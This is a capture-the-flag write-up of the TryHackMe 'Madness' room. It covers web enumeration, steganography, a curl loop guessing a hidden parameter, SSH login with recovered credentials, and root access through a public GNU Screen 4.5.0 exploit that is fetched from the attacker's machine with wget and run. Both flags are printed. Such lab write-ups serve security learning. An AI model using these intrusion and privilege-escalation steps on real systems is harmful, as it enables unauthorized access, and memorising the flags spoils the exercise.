# Madness

Laurent Chauvin | April 05, 2024

## Resources

[1] https://online.officerecovery.com
[2] https://www.dcode.fr/rot-cipher
[3] https://gtfobins.github.io/

## Progress

```
export IP=10.10.8.141
```
Nmap scan:
```bash
nmap -sC -sV -oN nmap/initial 10.10.8.141

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 21:38 EDT
Nmap scan report for 10.10.8.141
Host is up (0.090s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds
```

SSH and webserver found. Instruction states that it's not necessary to bruteforce ssh.

Webserver shows a default Apache page.

Gobuster scan:
```bash
gobuster dir -u 10.10.8.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.8.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 276]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


In the source code, we can read

```html
<!-- Modified from the Debian original for Ubuntu Last updated: 2014-03-19 See: https://launchpad.net/bugs/1288690 -->
```

By further looking at the code, we can see a reference to an image not loading:

```html
<img src="thm.jpg" class="floating_element">
<!-- They will never find me -->
```

We can also see:

```html
<!--
      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
```

The image `thm.jpg` cannot be loaded, but we can retrieve it with `wget http://10.10.8.141/thm.jpg`.

Trying to find if some message are hidden inside:

```bash
stegseek thm.jpg /opt/rockyou.txt 

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "thm.jpg" is not supported.
```

Opening the file with a binary editor, we can see the first few bytes are:

```
.PNG
```

However, even after renaming the image to .png, it still doesn't open. The image seems corrupted.

By using a recovery service like [1], we can get an image, showing a hidden directory: `/th1s_1s_h1dd3n`.

Going to this page http://10.10.8.141/th1s_1s_h1dd3n/ revealing some text:

```
Welcome! I have been expecting you!

To obtain my identity you need to guess my secret!

Secret Entered:

That is wrong! Get outta here!
```

Looking at source code we find:

```html
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here -->
```

We can try to use a value after the page (i.e. http://10.10.8.141/th1s_1s_h1dd3n/1) but it doesn't update the value after `Secret Entered`.
Maybe it's done with a GET method (i.e. http://10.10.8.141/th1s_1s_h1dd3n/?secret=1). Now the value is updated.

Let's loop with a command:

```bash
for i in {0..99}; do curl http://10.10.8.141/th1s_1s_h1dd3n/?secret="$i"; echo "$i"; done
```

We get lots of wrong results:

```html
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 99</p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```

But when we get at 73:

```html
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```

I tried CyberChef, hashes.com, crackstation.net on this string `y2RPJ4QaPF!B` but nothing. I thought it could be a youtube video id, but no. 

If this is a password for ssh, we need a username now.

I got stuck here. I had to go to a walkthrough, and although the method of the recovery website worked, the idea that had to be found was to replace the header of the image (being the header of the png initially) by the header of a jpg. It can be achieved with the following command:

```bash
 printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```

This is important, because then we can use steghide on it (which doesn't work on png):

```bash
steghide info thm.jpg     

"thm.jpg":
  format: jpeg
  capacity: 1.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: y2RPJ4QaPF!B
  embedded file "hidden.txt":
    size: 101.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

```

Let's extract this:

```bash
steghide --extract -sf thm.jpg

Enter passphrase: y2RPJ4QaPF!B
wrote extracted data to "hidden.txt".
```

Let's check this:

```bash
cat hidden.txt     

Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```

From here, the hint was really helpful (actually, I don't know how you're supposed to find this excepted with the hint):

```
There's something ROTten about this guys name!
```

From that, we can assume the username has been encrypted with Cesar cipher, maybe with a value of ten even.
After some test on [2], we see it's not a rotation of 10, but of 13.

We get the username `joker`.

Let's try to ssh now. Unfortunately it didn't work. After search for a while, I had to go look into a write-up. The solution is......difficult.

You have to download the image from the room (https://i.imgur.com/5iW7kC8.jpg). So counter-intuitive !!

When looking at it in `steghide` we find:

```bash
steghide info 5iW7kC8.jpeg    

"5iW7kC8.jpeg":
  format: jpeg
  capacity: 6.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "password.txt":
    size: 83.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Extracting the file:

```bash
steghide --extract -sf 5iW7kC8.jpeg

Enter passphrase: 
wrote extracted data to "password.txt".
```

Looking at the text file:

```bash
cat password.txt 

I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

Now we can ssh !!!

```bash
ssh joker@$IP   

joker@10.10.8.141's password: *axA&GF8dP
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ 
```

From there we find the first flag:

```bash
joker@ubuntu:~$ cat user.txt 

THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

Let's get the root flag now !!

Cannot sudo apparently.

```bash
joker@ubuntu:~$ sudo -l

[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
```

Nothing in `.bash_history`.

Let's look at SUID files:

```bash
joker@ubuntu:~$ find / -user root -perm -u=s 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
```

After checking most of them on GTFObins [3] I didn't get much. However, when searching for exploits, I found:

```bash
searchsploit screen 4.5.0   

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                                             | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                                                       | linux/local/41152.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

Let's try it !!

```bash
searchsploit -m linux/local/41154.sh

  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /home/kali/ctf/thm/Madness/41154.sh
```

Let's start a webserver on our local machine:

```bash
python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now from our target machine, let's download the script:

```bash
wget 10.6.31.49:8080/41154.sh

--2024-04-05 20:34:10--  http://10.6.31.49:8080/41154.sh
Connecting to 10.6.31.49:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1149 (1.1K) [text/x-sh]
Saving to: ‘41154.sh’

41154.sh                                                   100%[========================================================================================================================================>]   1.12K  --.-KB/s    in 0s      

2024-04-05 20:34:10 (180 MB/s) - ‘41154.sh’ saved [1149/1149]

/tmp: Scheme missing.
FINISHED --2024-04-05 20:34:10--
Total wall clock time: 0.2s
Downloaded: 1 files, 1.1K in 0s (180 MB/s)
```

Let's execute it !!

```bash
sh 41154.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.
```

Let's verify:

```bash
# whoami

root
```

Yaaay !! Let's get our flag !!

```bash
cat /root/root.txt

THM{5ecd98aa66a6abb670184d7547c8124a}
```

## Flag

1. User

```
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

2. Privesc

```
THM{5ecd98aa66a6abb670184d7547c8124a}
```
